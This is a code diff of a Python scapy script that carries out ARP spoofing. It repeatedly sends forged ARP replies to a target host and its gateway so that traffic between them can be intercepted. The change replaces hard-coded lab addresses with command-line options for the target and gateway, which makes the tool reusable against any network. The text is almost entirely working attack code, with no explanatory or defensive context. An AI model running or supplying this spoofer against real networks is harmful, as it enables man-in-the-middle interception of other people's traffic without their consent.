@@ -2,6 +2,7 @@
 import scapy.all as scapy
 import time
 import sys
+import optparse
 
 def get_mac(ip):
     arp_request = scapy.ARP(pdst=ip)
@@ -22,19 +23,35 @@ def spoof(target_ip, spoof_ip):
     scapy.send(packet, verbose = False)
 package_sent = 0
 
-target_IP = "10.0.2.2"
-gateway = "10.0.2.1"
+
+def arguments():
+    parser = optparse.OptionParser()
+    parser.add_option("-t", "--target", dest="target_IP", help="Enter the Target IP")
+    parser.add_option("-g", "--gateway", dest="gateway", help="Enter the gateway of the network")
+    (options, arguments) = parser.parse_args()
+    if not options.target_IP:
+        parser.error("[+] Please specify a the IP of the client")
+    elif not options.gateway:
+        parser.error("[+] Please specify the gateway of the network")
+    else:
+        return options
+
+options = arguments()
+
+#target_IP = "10.0.2.2"
+#gateway = "10.0.2.1"
 
 try:
     while True:
-        spoof(target_IP,gateway)
-        spoof(gateway, target_IP)
+        spoof(options.target_IP,options.gateway)
+        spoof(options.gateway, options.target_IP)
         package_sent = package_sent+2
         print("\r[+] Packages sent: "+str(package_sent)),
         sys.stdout.flush()
         time.sleep(2)
 
 except KeyboardInterrupt:
-    restore(target_IP, gateway)
-    restore(gateway, target_IP)
+    restore(options.target_IP, options.gateway)
+    restore(options.gateway, options.target_IP)
     print("\n[+] ctrl + c Detected, quitting\n Resetting IP tables... please wait ")
+
